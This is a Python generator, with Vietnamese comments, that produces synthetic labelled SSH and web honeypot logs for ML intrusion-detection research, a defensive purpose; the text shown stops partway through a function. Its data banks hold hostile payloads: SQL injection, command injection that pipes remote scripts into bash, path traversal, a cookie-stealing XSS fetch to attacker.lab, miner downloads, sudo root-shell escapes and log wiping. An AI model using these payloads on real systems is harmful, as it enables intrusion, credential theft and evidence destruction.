#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
ADAPTIVE HONEYPOT - MACHINE LEARNING EVALUATION BATCH GENERATOR (OOD TESTSET)
=============================================================================
Mục đích:
  Tạo tập dữ liệu log Honeypot gốc (Raw JSONL) hoàn toàn mới, chuyên biệt cho
  huấn luyện và đánh giá mô hình Học máy (Machine Learning / Deep Learning):
  - 100% dữ liệu gốc dạng sự kiện tuần tự (Raw event stream, không gom cụm trước).
  - Tích hợp đầy đủ trường run_id, campaign_id, scenario_id, session_id.
  - Cung cấp siêu dữ liệu cảm biến Honeypot (phiên bản, dịch vụ, node_id).
  - Giữ nguyên timestamp chính xác đến mili-giây với quan hệ nhân quả (causality).
  - Gán nhãn Ground Truth chuẩn (MITRE ATT&CK, attack_category, binary_label).
  - Tự động xuất manifest.json và tài liệu mô tả đặc trưng dataset cho Luận văn.
"""

import os
import sys
import io
import time
import json
import uuid
import random
import datetime
from pathlib import Path
from typing import List, Dict, Any, Tuple
from collections import Counter, defaultdict

# Ensure UTF-8 output on Windows
if sys.platform == "win32":
    try:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8")
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8")
    except Exception:
        pass

BASE_DIR = Path(__file__).resolve().parent
LOGS_DIR = BASE_DIR / "logs"
OUTPUT_BATCH_FILE = LOGS_DIR / "ml_benchmark_batch_raw.jsonl"
OUTPUT_MANIFEST_FILE = LOGS_DIR / "ml_benchmark_manifest.json"
OUTPUT_DOC_FILE = BASE_DIR / "ML_DATASET_DOCUMENTATION.md"

# =====================================================================
# METADATA CỦA HỆ THỐNG HONEYPOT
# =====================================================================
HONEYPOT_SENSOR_INFO = {
    "SSH": {
        "sensor_name": "Adaptive-Honeypot-Deception-Engine",
        "sensor_version": "2.1.0-Release",
        "node_id": "sensor-hcm-edge-ssh-01",
        "emulated_service": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4",
        "internal_port": 2222,
        "runtime_environment": "Python Asyncio Stateful VFS + eBPF Monitor"
    },
    "HTTP": {
        "sensor_name": "Adaptive-Honeypot-Deception-Engine",
        "sensor_version": "2.1.0-Release",
        "node_id": "sensor-hcm-edge-web-01",
        "emulated_service": "Apache/2.4.52 (Ubuntu) PHP/8.1.2 DVWA-2.0",
        "internal_port": 80,
        "runtime_environment": "Docker Containerized Low-Interaction Trap"
    }
}

# =====================================================================
# DANH MỤC CHIẾN DỊCH & KỊCH BẢN (CAMPAIGNS & SCENARIOS)
# =====================================================================
CAMPAIGNS_DEF = {
    "CAMP-2026-BOTNET-AUTO": {
        "name": "Automated Botnet Commodity Sweeps",
        "description": "Chiến dịch botnet tự động quét diện rộng, dò mật khẩu mặc định và tải malware đào coin (XMRig/Mirai).",
        "threat_actor_type": "Automated Botnet / Script Kiddie",
        "target_surface": ["SSH", "HTTP"]
    },
    "CAMP-2026-WEB-PENTEST": {
        "name": "Targeted Web Application Fuzzing & Exploitation",
        "description": "Chiến dịch kiểm thử xâm nhập web có chủ đích, khai thác lỗ hổng OWASP Top 10 (SQLi, CMDi, LFI, XSS).",
        "threat_actor_type": "External Penetration Tester / Web Threat Actor",
        "target_surface": ["HTTP"]
    },
    "CAMP-2026-HUMAN-APT": {
        "name": "Interactive Hands-On-Keyboard Targeted Intrusion",
        "description": "Kẻ tấn công con người điều khiển shell trực tiếp sau khi chiếm quyền truy cập, leo thang qua GTFOBins.",
        "threat_actor_type": "Advanced Persistent Threat (APT) / Hands-on Operator",
        "target_surface": ["SSH"]
    },
    "CAMP-2026-LATERAL-INSIDER": {
        "name": "Internal Lateral Pivot & Reconnaissance",
        "description": "Mô phỏng hành vi tấn công nội bộ (Insider) hoặc bước di chuyển ngang sau khi thâm nhập máy trạm LAN.",
        "threat_actor_type": "Malicious Insider / Lateral Pivot",
        "target_surface": ["SSH", "HTTP"]
    }
}

SCENARIOS_DEF = {
    # SSH Scenarios
    "SCN-SSH-BRUTE": {
        "campaign_id": "CAMP-2026-BOTNET-AUTO",
        "name": "SSH Password Guessing & Dictionary Stuffing",
        "expected_tactic": "Credential Access",
        "expected_technique": "T1110.001 - Brute Force: Password Guessing",
        "attack_category": "Brute-Force",
        "binary_label": 1
    },
    "SCN-SSH-SYSRECON": {
        "campaign_id": "CAMP-2026-HUMAN-APT",
        "name": "Multi-Step System & Environment Discovery",
        "expected_tactic": "Discovery",
        "expected_technique": "T1082 - System Information Discovery",
        "attack_category": "Discovery",
        "binary_label": 1
    },
    "SCN-SSH-NETRECON": {
        "campaign_id": "CAMP-2026-LATERAL-INSIDER",
        "name": "Internal Network & Process Mapping",
        "expected_tactic": "Discovery",
        "expected_technique": "T1049 - System Network Connections Discovery",
        "attack_category": "Discovery",
        "binary_label": 1
    },
    "SCN-SSH-GTFOBINS": {
        "campaign_id": "CAMP-2026-HUMAN-APT",
        "name": "Privilege Escalation via GTFOBins & Sudo Abuse",
        "expected_tactic": "Privilege Escalation",
        "expected_technique": "T1548.003 - Abuse Elevation Control Mechanism: Sudo Caching",
        "attack_category": "Privilege-Escalation",
        "binary_label": 1
    },
    "SCN-SSH-C2STAGE": {
        "campaign_id": "CAMP-2026-BOTNET-AUTO",
        "name": "C2 Ingress Tool Transfer & Staging",
        "expected_tactic": "Command and Control",
        "expected_technique": "T1105 - Ingress Tool Transfer",
        "attack_category": "C2-Malware",
        "binary_label": 1
    },
    "SCN-SSH-DEFENSE-EVASION": {
        "campaign_id": "CAMP-2026-HUMAN-APT",
        "name": "Indicator Removal & History Clearing",
        "expected_tactic": "Defense Evasion",
        "expected_technique": "T1070.003 - Indicator Removal: Clear Command History",
        "attack_category": "Defense-Evasion",
        "binary_label": 1
    },
    "SCN-SSH-PORT-SCAN": {
        "campaign_id": "CAMP-2026-BOTNET-AUTO",
        "name": "Network Service Discovery / Banner Grab",
        "expected_tactic": "Discovery",
        "expected_technique": "T1046 - Network Service Discovery",
        "attack_category": "Port-Scan",
        "binary_label": 1
    },

    # Web Scenarios
    "SCN-WEB-SQLI-ADVANCED": {
        "campaign_id": "CAMP-2026-WEB-PENTEST",
        "name": "SQL Injection Data Extraction & Blind Probes",
        "expected_tactic": "Initial Access",
        "expected_technique": "T1190 - Exploit Public-Facing Application: SQL Injection",
        "attack_category": "Web-Exploit-SQLi",
        "binary_label": 1
    },
    "SCN-WEB-CMDi-CHAIN": {
        "campaign_id": "CAMP-2026-WEB-PENTEST",
        "name": "OS Command Injection & Reverse Shell Staging",
        "expected_tactic": "Execution",
        "expected_technique": "T1059.004 - Command and Scripting Interpreter: Unix Shell",
        "attack_category": "Web-Exploit-CMDi",
        "binary_label": 1
    },
    "SCN-WEB-LFI-WRAPPER": {
        "campaign_id": "CAMP-2026-WEB-PENTEST",
        "name": "Local File Inclusion & Traversal Bypass",
        "expected_tactic": "Credential Access",
        "expected_technique": "T1552.001 - Unsecured Credentials: Local File Inclusion",
        "attack_category": "Web-Exploit-LFI",
        "binary_label": 1
    },
    "SCN-WEB-XSS-EXFIL": {
        "campaign_id": "CAMP-2026-WEB-PENTEST",
        "name": "Cross-Site Scripting Injection",
        "expected_tactic": "Execution",
        "expected_technique": "T1059.007 - Command and Scripting Interpreter: JavaScript",
        "attack_category": "Web-Exploit-XSS",
        "binary_label": 1
    },
    "SCN-WEB-WEBSHELL-UPLOAD": {
        "campaign_id": "CAMP-2026-WEB-PENTEST",
        "name": "Web Shell Upload & Component Staging",
        "expected_tactic": "Persistence",
        "expected_technique": "T1505.003 - Server Software Component: Web Shell",
        "attack_category": "Web-Exploit-Upload",
        "binary_label": 1
    },
    "SCN-WEB-SCANNER-SWEEP": {
        "campaign_id": "CAMP-2026-BOTNET-AUTO",
        "name": "Automated Scanner Surface Sweep (Nikto/SQLMap)",
        "expected_tactic": "Discovery",
        "expected_technique": "T1046 - Network Service Discovery: Automated Scanner",
        "attack_category": "Web-Scanner",
        "binary_label": 1
    },
    "SCN-WEB-BENIGN-TRAFFIC": {
        "campaign_id": "CAMP-2026-LATERAL-INSIDER",
        "name": "Benign Administrative Browsing & Health Check",
        "expected_tactic": "Normal-Operation",
        "expected_technique": "Normal Traffic",
        "attack_category": "Benign",
        "binary_label": 0
    }
}

# =====================================================================
# POOL DỮ LIỆU ĐA DẠNG CAO CẤP
# =====================================================================
IP_POOLS = [
    # VN Telco Ranges
    "14.161.", "113.160.", "171.244.", "123.30.", "118.69.", "27.72.", "42.112.",
    # US / Americas Cloud & Residential
    "54.210.", "34.201.", "198.51.", "23.227.", "142.93.", "104.248.", "165.227.", "192.241.",
    # Europe
    "159.69.", "88.198.", "144.76.", "51.15.", "151.80.", "178.32.", "188.165.", "91.121.",
    # Asia
    "222.186.", "117.185.", "180.167.", "128.199.", "133.242.", "211.234.", "103.253.",
    # Tor / Proxy / Bulletproof
    "185.220.", "95.173.", "194.38.", "185.156.", "77.247.", "109.236.", "194.26.",
    # Internal Pivot / RFC-1918
    "10.0.1.", "10.10.5.", "172.16.20.", "192.168.1."
]

USER_AGENTS = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6 (Nikto/2.1.6; OpenSSL/1.1.1)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "OWASP ZAP/2.13.0",
    "gobuster/3.5.0 (https://github.com/OJ/gobuster)",
    "nuclei/v2.9.8 (https://projectdiscovery.io)",
    "curl/7.88.1 (x86_64-pc-linux-gnu)",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
]

SSH_CRED_DICT = [
    ("root", "123456"), ("root", "toor"), ("root", "admin"), ("root", "password123"),
    ("admin", "admin123"), ("admin", "password"), ("ubuntu", "ubuntu123"),
    ("user", "user123"), ("postgres", "postgres"), ("oracle", "oracle"),
    ("support", "support123"), ("cisco", "cisco"), ("ubnt", "ubnt"),
    ("guest", "guest"), ("test", "test1234"), ("operator", "operator")
]

SSH_VALID_CREDS = [
    ("root", "123"), ("root", "root"), ("admin", "admin"),
    ("ubuntu", "123"), ("user", "123")
]

# Command execution banks
SSH_CMDS = {
    "sysrecon": [
        ("whoami", "root", 12.5),
        ("id", "uid=0(root) gid=0(root) groups=0(root)", 14.2),
        ("uname -a", "Linux honeypot-srv 5.15.0-101-generic #111-Ubuntu SMP x86_64 GNU/Linux", 18.0),
        ("hostname", "honeypot-gateway", 9.1),
        ("cat /etc/os-release", "NAME=\"Ubuntu\"\nVERSION=\"22.04.3 LTS (Jammy Jellyfish)\"", 22.3),
        ("lscpu", "Architecture: x86_64\nCPU op-mode(s): 32-bit, 64-bit\nModel name: Intel Xeon E5-2680 v4", 35.1),
        ("free -m", "Mem: 7942 total, 920 used, 5612 free", 15.6),
        ("df -h", "Filesystem Size Used Avail Use% Mounted on\n/dev/sda1 49G 14G 33G 30% /", 19.4),
        ("uptime", "12:00:00 up 45 days, 4:10, 1 user, load average: 0.08, 0.05, 0.01", 11.2)
    ],
    "netrecon": [
        ("ip a", "1: lo: <LOOPBACK,UP> mtu 65536\n2: eth0: <BROADCAST,MULTICAST,UP> inet 192.168.101.218/24", 25.0),
        ("netstat -tlpn", "tcp 0 0 0.0.0.0:2222 0.0.0.0:* LISTEN 17460/python3\ntcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 8920/docker-proxy", 32.1),
        ("ss -tulpn", "Netid State Local Address:Port Peer Address:Port\ntcp LISTEN 0.0.0.0:2222 0.0.0.0:*", 28.4),
        ("arp -a", "? (192.168.101.1) at 00:50:56:c0:00:08 [ether] on eth0", 17.8),
        ("cat /etc/resolv.conf", "nameserver 192.168.101.2\nnameserver 8.8.8.8", 12.0),
        ("ps aux", "USER PID %CPU %MEM COMMAND\nroot 1 0.0 0.1 /sbin/init\nroot 17460 0.2 0.8 python3 main.py", 42.0)
    ],
    "gtfobins": [
        ("sudo -l", "User root may run the following commands on honeypot-srv:\n    (ALL) NOPASSWD: /usr/bin/find, /usr/bin/vim, /usr/bin/nmap", 21.0),
        ("find / -perm -u=s -type f 2>/dev/null", "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/pkexec", 55.4),
        ("sudo find . -exec /bin/sh \\; -quit", "# (Spawned root shell)", 68.2),
        ("sudo nmap --interactive", "nmap> !sh\n#", 75.0),
        ("sudo vim -c '!sh'", "# (Spawned root shell)", 82.1),
        ("sudo awk 'BEGIN {system(\"/bin/sh\")}'", "# (Spawned root shell)", 62.4)
    ],
    "c2stage": [
        ("cd /tmp", "", 8.5),
        ("curl -O http://194.26.29.112:8080/setup.sh", "100 2048 100 2048 0 0 14500 0 --:--:-- --:--:-- --:--:-- 14524", 120.5),
        ("wget http://185.220.101.5/miner.elf -O /tmp/miner", "miner.elf 100%[===================>] 1.42M 2.15MB/s in 0.7s", 185.0),
        ("chmod +x /tmp/miner", "", 12.0),
        ("chmod +x setup.sh", "", 11.2),
        ("./setup.sh &", "[1] 19821", 45.0),
        ("curl -fsSL http://attacker.cc/update | bash", "[*] Initializing background payload daemon...", 155.0)
    ],
    "evasion": [
        ("history -c", "", 10.1),
        ("unset HISTFILE", "", 8.4),
        ("export HISTFILESIZE=0", "", 9.0),
        ("cat /dev/null > ~/.bash_history", "", 15.2),
        ("rm -rf /var/log/auth.log", "", 18.7)
    ]
}

def get_random_ip() -> str:
    pfx = random.choice(IP_POOLS)
    return f"{pfx}{random.randint(2, 254)}"

# =====================================================================
# BỘ SINH DỮ LIỆU CHUẨN ML BENCHMARK
# =====================================================================
class MLBenchmarkGenerator:
    """
    Sinh tập batch sự kiện Honeypot nguyên bản (Raw Event Stream) chuẩn hóa cho ML.
    Mỗi record chứa đầy đủ ground truth, causality sequence, run_id, campaign_id, scenario_id.
    """
    def __init__(self, target_events: int = 10000, days_span: int = 14):
        self.target_events = target_events
        self.days_span = days_span
        self.raw_events: List[Dict[str, Any]] = []
        self.run_metadata: Dict[str, Any] = {}
        self.stats = {
            "total_events": 0,
            "total_sessions": 0,
            "campaigns": Counter(),
            "scenarios": Counter(),
            "protocols": Counter(),
            "attack_categories": Counter(),
            "binary_labels": Counter()
        }

    def generate(self) -> Tuple[List[Dict[str, Any]], Dict[str, Any]]:
        print("=" * 80)
        print(f"🤖 [ML BENCHMARK GENERATOR] ĐANG SINH {self.target_events:,} SỰ KIỆN GỐC CHO ĐÁNH GIÁ MÔ HÌNH")
        print(f"📌 Chế độ: Raw Event-by-Event Sequence | Multi-Scenario | Ground Truth Labeled")
        print("=" * 80)

        # Định nghĩa 4 đợt chạy (Runs) ứng với các campaign
        runs = [
            {"run_id": "RUN-20261102-BATCH01-BOTNET", "campaign_id": "CAMP-2026-BOTNET-AUTO", "weight": 0.35},
            {"run_id": "RUN-20261102-BATCH02-WEBPEN", "campaign_id": "CAMP-2026-WEB-PENTEST", "weight": 0.35},
            {"run_id": "RUN-20261102-BATCH03-HUMANAPT", "campaign_id": "CAMP-2026-HUMAN-APT", "weight": 0.20},
            {"run_id": "RUN-20261102-BATCH04-INSIDER", "campaign_id": "CAMP-2026-LATERAL-INSIDER", "weight": 0.10}
        ]

        now = datetime.datetime.now(datetime.timezone.utc)
        start_time = now - datetime.timedelta(days=self.days_span)
        current_time = start_time
        time_step = (self.days_span * 86400) / max(1, self.target_events)

        session_counter = 0

        while len(self.raw_events) < self.target_events:
            # Chọn run và campaign tương ứng
            run_obj = random.choices(runs, weights=[r["weight"] for r in runs], k=1)[0]
            run_id = run_obj["run_id"]
            camp_id = run_obj["campaign_id"]

            session_id = str(uuid.uuid4())
            session_counter += 1

            # Tiến thời gian ngẫu nhiên (Poisson-like arrival)
            current_time += datetime.timedelta(seconds=random.uniform(time_step * 0.5, time_step * 2.0))

            # Quyết định giao thức dựa trên campaign
            if camp_id == "CAMP-2026-WEB-PENTEST":
                sess_events = self._generate_web_session(run_id, camp_id, session_id, current_time)
            elif camp_id == "CAMP-2026-HUMAN-APT":
                sess_events = self._generate_ssh_interactive_session(run_id, camp_id, session_id, current_time)
            elif camp_id == "CAMP-2026-BOTNET-AUTO":
                if random.random() < 0.6:
                    sess_events = self._generate_ssh_botnet_session(run_id, camp_id, session_id, current_time)
                else:
                    sess_events = self._generate_web_scanner_session(run_id, camp_id, session_id, current_time)
            else: # LATERAL-INSIDER
                if random.random() < 0.5:
                    sess_events = self._generate_ssh_insider_session(run_id, camp_id, session_id, current_time)
                else:
                    sess_events = self._generate_web_benign_session(run_id, camp_id, session_id, current_time)

            for ev in sess_events:
                if len(self.raw_events) >= self.target_events:
                    break
                self.raw_events.append(ev)
                self.stats["campaigns"][ev["campaign_id"]] += 1
                self.stats["scenarios"][ev["scenario_id"]] += 1
                self.stats["protocols"][ev["protocol"]] += 1
                self.stats["attack_categories"][ev["ground_truth"]["attack_category"]] += 1
                self.stats["binary_labels"][ev["ground_truth"]["binary_label"]] += 1

            if len(self.raw_events) % 1000 == 0:
                print(f"  • Đã sinh: {len(self.raw_events):,}/{self.target_events:,} sự kiện ({len(self.raw_events)/self.target_events*100:.1f}%)")

        self.stats["total_events"] = len(self.raw_events)
        self.stats["total_sessions"] = session_counter

        # Sắp xếp theo dòng thời gian chuẩn xác
        self.raw_events.sort(key=lambda x: x["timestamp"])

        # Tạo manifest metadata
        manifest = {
            "dataset_id": "DATASET-OOD-ML-HONEYPOT-2026",
            "batch_id": "BATCH-20261102-BENCHMARK-01",
            "created_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "target_system": "Adaptive Honeypot Two-Tier Architecture (Stateful SSH + DVWA)",
            "total_events": self.stats["total_events"],
            "total_sessions": self.stats["total_sessions"],
            "unique_source_ips": len(set(e["source_ip"] for e in self.raw_events)),
            "runs": runs,
            "campaigns": CAMPAIGNS_DEF,
            "scenarios": SCENARIOS_DEF,
            "statistics": {
                "protocols": dict(self.stats["protocols"]),
                "binary_labels": {"Benign (0)": self.stats["binary_labels"][0], "Malicious (1)": self.stats["binary_labels"][1]},
                "attack_categories": dict(self.stats["attack_categories"]),
                "scenarios_breakdown": dict(self.stats["scenarios"]),
                "campaigns_breakdown": dict(self.stats["campaigns"])
            }
        }
        return self.raw_events, manifest

    def _generate_web_session(self, run_id: str, camp_id: str, session_id: str, start_dt: datetime.datetime) -> List[Dict[str, Any]]:
        """Sinh phiên tấn công Web nhiều bước (Fuzzing -> SQLi/CMDi -> Webshell)."""
        src_ip = get_random_ip()
        src_port = random.randint(1025, 65534)
        ua = random.choice(USER_AGENTS)
        events = []

        scenario_choice = random.choices(
            ["SCN-WEB-SQLI-ADVANCED", "SCN-WEB-CMDi-CHAIN", "SCN-WEB-LFI-WRAPPER", "SCN-WEB-XSS-EXFIL", "SCN-WEB-WEBSHELL-UPLOAD"],
            weights=[35, 25, 20, 10, 10],
            k=1
        )[0]
        scen_meta = SCENARIOS_DEF[scenario_choice]

        # Chuỗi request trong phiên
        num_requests = random.randint(2, 6)
        curr_dt = start_dt

        for seq in range(1, num_requests + 1):
            curr_dt += datetime.timedelta(seconds=random.uniform(0.4, 2.5))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

            if scenario_choice == "SCN-WEB-SQLI-ADVANCED":
                payload = random.choice([
                    "1' UNION SELECT user, password FROM users -- -",
                    "1' AND (SELECT 1 FROM (SELECT(SLEEP(4)))a)-- -",
                    "1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() #",
                    "1' AND ExtractValue(1, concat(0x5c, (select version())))-- -"
                ])
                uri = f"/vulnerabilities/sqli/?id={payload}&Submit=Submit"
                method = "GET"
                status_code = random.choice([200, 200, 500])
            elif scenario_choice == "SCN-WEB-CMDi-CHAIN":
                payload = random.choice([
                    "127.0.0.1; whoami && id",
                    "127.0.0.1; cat /etc/passwd",
                    "127.0.0.1; curl -s http://194.26.29.112:8080/setup.sh | bash",
                    "127.0.0.1 && wget -O /tmp/bot http://185.220.101.5/bot && chmod +x /tmp/bot"
                ])
                uri = f"/vulnerabilities/exec/?ip={payload}&Submit=Submit"
                method = "POST"
                status_code = 200
            elif scenario_choice == "SCN-WEB-LFI-WRAPPER":
                payload = random.choice([
                    "../../../../etc/passwd",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "../../../../proc/self/environ",
                    "....//....//....//....//etc/passwd"
                ])
                uri = f"/vulnerabilities/fi/?page={payload}"
                method = "GET"
                status_code = random.choice([200, 404])
            elif scenario_choice == "SCN-WEB-XSS-EXFIL":
                payload = random.choice([
                    "<script>fetch('http://attacker.lab/log?c='+document.cookie)</script>",
                    "<svg onload=alert(1)>",
                    "<img src=x onerror=alert(document.domain)>"
                ])
                uri = f"/vulnerabilities/xss_r/?name={payload}"
                method = "GET"
                status_code = 200
            else: # WEBSHELL-UPLOAD
                fn = random.choice(["cmd.phtml", "shell.php", "backdoor.php5"])
                uri = f"/vulnerabilities/upload/uploads/{fn}"
                method = "POST"
                status_code = 200

            resp_bytes = random.randint(450, 4200)
            record = {
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": scenario_choice,
                "honeypot": HONEYPOT_SENSOR_INFO["HTTP"],
                "session_id": session_id,
                "sequence_number": seq,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "HTTP",
                "event_status": "Web_Request",
                "method": method,
                "uri": uri,
                "http_status_code": status_code,
                "bytes_transferred": resp_bytes,
                "user_agent": ua,
                "raw_event_payload": f'{method} {uri} HTTP/1.1 -> {status_code} ({resp_bytes} bytes)',
                "ground_truth": {
                    "binary_label": scen_meta["binary_label"],
                    "attack_class": "Malicious" if scen_meta["binary_label"] == 1 else "Benign",
                    "attack_category": scen_meta["attack_category"],
                    "mitre_tactic": scen_meta["expected_tactic"],
                    "mitre_technique": scen_meta["expected_technique"],
                    "confidence": "High"
                }
            }
            events.append(record)
        return events

    def _generate_web_scanner_session(self, run_id: str, camp_id: str, session_id: str, start_dt: datetime.datetime) -> List[Dict[str, Any]]:
        """Sinh chuỗi quét tự động (Nikto / SQLMap / Nuclei)."""
        src_ip = get_random_ip()
        src_port = random.randint(1025, 65534)
        ua = random.choice(["Nikto/2.1.6", "sqlmap/1.7.2#stable", "nuclei/v2.9.8", "gobuster/3.5.0"])
        events = []
        scen_meta = SCENARIOS_DEF["SCN-WEB-SCANNER-SWEEP"]

        paths = ["/phpmyadmin/", "/.env", "/wp-login.php", "/.git/config", "/api/v1/health", "/backup.sql"]
        curr_dt = start_dt

        for seq, p in enumerate(random.sample(paths, k=random.randint(3, len(paths))), start=1):
            curr_dt += datetime.timedelta(seconds=random.uniform(0.1, 0.4))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            code = random.choice([404, 403, 301])
            bytes_sent = random.randint(150, 450)

            record = {
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-WEB-SCANNER-SWEEP",
                "honeypot": HONEYPOT_SENSOR_INFO["HTTP"],
                "session_id": session_id,
                "sequence_number": seq,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "HTTP",
                "event_status": "Web_Request",
                "method": "GET",
                "uri": p,
                "http_status_code": code,
                "bytes_transferred": bytes_sent,
                "user_agent": ua,
                "raw_event_payload": f'GET {p} HTTP/1.1 -> {code}',
                "ground_truth": {
                    "binary_label": scen_meta["binary_label"],
                    "attack_class": "Malicious",
                    "attack_category": scen_meta["attack_category"],
                    "mitre_tactic": scen_meta["expected_tactic"],
                    "mitre_technique": scen_meta["expected_technique"],
                    "confidence": "High"
                }
            }
            events.append(record)
        return events

    def _generate_web_benign_session(self, run_id: str, camp_id: str, session_id: str, start_dt: datetime.datetime) -> List[Dict[str, Any]]:
        """Sinh lưu lượng duyệt web thông thường / hợp lệ (Benign)."""
        src_ip = get_random_ip()
        src_port = random.randint(1025, 65534)
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0"
        events = []
        scen_meta = SCENARIOS_DEF["SCN-WEB-BENIGN-TRAFFIC"]

        benign_pages = ["/login.php", "/index.php", "/instructions.php", "/about.php"]
        curr_dt = start_dt

        for seq, p in enumerate(benign_pages[:random.randint(2, 4)], start=1):
            curr_dt += datetime.timedelta(seconds=random.uniform(1.2, 4.5))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

            record = {
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-WEB-BENIGN-TRAFFIC",
                "honeypot": HONEYPOT_SENSOR_INFO["HTTP"],
                "session_id": session_id,
                "sequence_number": seq,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "HTTP",
                "event_status": "Web_Request",
                "method": "GET",
                "uri": p,
                "http_status_code": 200,
                "bytes_transferred": random.randint(1200, 3500),
                "user_agent": ua,
                "raw_event_payload": f'GET {p} HTTP/1.1 -> 200 OK',
                "ground_truth": {
                    "binary_label": scen_meta["binary_label"],
                    "attack_class": "Benign",
                    "attack_category": scen_meta["attack_category"],
                    "mitre_tactic": scen_meta["expected_tactic"],
                    "mitre_technique": scen_meta["expected_technique"],
                    "confidence": "High"
                }
            }
            events.append(record)
        return events

    def _generate_ssh_botnet_session(self, run_id: str, camp_id: str, session_id: str, start_dt: datetime.datetime) -> List[Dict[str, Any]]:
        """Sinh phiên Botnet quét SSH: Dò mật khẩu hoặc tải miner."""
        src_ip = get_random_ip()
        src_port = random.randint(1025, 65534)
        events = []
        curr_dt = start_dt

        # 1. Thử dò mật khẩu 2-5 lần
        attempts = random.randint(2, 5)
        for seq in range(1, attempts + 1):
            curr_dt += datetime.timedelta(seconds=random.uniform(0.6, 2.0))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            u, p = random.choice(SSH_CRED_DICT)
            scen_meta = SCENARIOS_DEF["SCN-SSH-BRUTE"]

            ev = {
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-SSH-BRUTE",
                "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
                "session_id": session_id,
                "sequence_number": seq,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "SSH",
                "event_status": "Auth_Failed",
                "username": u,
                "password": p,
                "raw_event_payload": f"SSH Login Failed: user '{u}' pass '{p}'",
                "ground_truth": {
                    "binary_label": scen_meta["binary_label"],
                    "attack_class": "Malicious",
                    "attack_category": scen_meta["attack_category"],
                    "mitre_tactic": scen_meta["expected_tactic"],
                    "mitre_technique": scen_meta["expected_technique"],
                    "confidence": "High"
                }
            }
            events.append(ev)

        # 30% trường hợp botnet đăng nhập trúng và tải payload
        if random.random() < 0.30:
            u, p = random.choice(SSH_VALID_CREDS)
            curr_dt += datetime.timedelta(seconds=random.uniform(0.5, 1.5))
            iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            auth_succ = {
                "run_id": run_id,
                "campaign_id": camp_id,
                "scenario_id": "SCN-SSH-BRUTE",
                "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
                "session_id": session_id,
                "sequence_number": len(events) + 1,
                "timestamp": iso_time,
                "source_ip": src_ip,
                "source_port": src_port,
                "protocol": "SSH",
                "event_status": "Auth_Success",
                "username": u,
                "password": p,
                "raw_event_payload": f"SSH Login Success: user '{u}'",
                "ground_truth": {
                    "binary_label": 1,
                    "attack_class": "Malicious",
                    "attack_category": "Brute-Force",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "T1078.003 - Valid Accounts",
                    "confidence": "High"
                }
            }
            events.append(auth_succ)

            # Các lệnh tải miner
            scen_c2 = SCENARIOS_DEF["SCN-SSH-C2STAGE"]
            for cmd, out, lat in SSH_CMDS["c2stage"][:3]:
                curr_dt += datetime.timedelta(seconds=random.uniform(0.5, 2.0))
                iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
                cmd_ev = {
                    "run_id": run_id,
                    "campaign_id": camp_id,
                    "scenario_id": "SCN-SSH-C2STAGE",
                    "honeypot": HONEYPOT_SENSOR_INFO["SSH"],
                    "session_id": session_id,
                    "sequence_number": len(events) + 1,
                    "timestamp": iso_time,
                    "source_ip": src_ip,
                    "source_port": src_port,
                    "protocol": "SSH",
                    "event_status": "Interaction",
                    "command": cmd,
                    "command_output": out,
                    "latency_ms": lat,
                    "raw_event_payload": f"$ {cmd}\n{out}",
                    "ground_truth": {
                        "binary_label": scen_c2["binary_label"],
                        "attack_class": "Malicious",
                        "attack_category": scen_c2["attack_category"],
                        "mitre_tactic": scen_c2["expected_tactic"],
                        "mitre_technique": scen_c2["expected_technique"],
                        "confidence": "High"
                    }
                }
                events.append(cmd_ev)

        return events

    def _generate_ssh_interactive_session(self, run_id: str, camp_id: str, session_id: str, start_dt: datetime.datetime) -> List[Dict[str, Any]]:
        """Sinh phiên tương tác APT có người điều khiển: Recon -> GTFOBins Leo thang -> Xóa lịch sử."""
        src_ip = get_random_ip()
        src_port = random.randint(1025, 65534)
        u, p = random.choice(SSH_VALID_CREDS)
        events = []
        curr_dt = start_dt

        # 1. Đăng nhập thành công
        iso_time = curr_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        events.append({
            "run_id": run_id,
